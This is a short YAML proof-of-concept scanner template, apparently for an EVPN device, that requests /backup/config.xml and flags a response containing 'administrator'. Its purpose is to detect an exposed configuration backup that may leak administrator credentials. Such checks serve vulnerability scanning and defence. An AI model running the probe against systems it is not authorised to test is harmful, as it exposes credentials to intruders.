name: poc-yaml-evpn-information
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /backup/config.xml
        expression: response.status == 200 && "administrator".bmatches(response.body)
expression: r0()
detail:
    author: Henry4E36(https://github.com/Henry4E36)
    links:
      - https://github.com/Henry4E36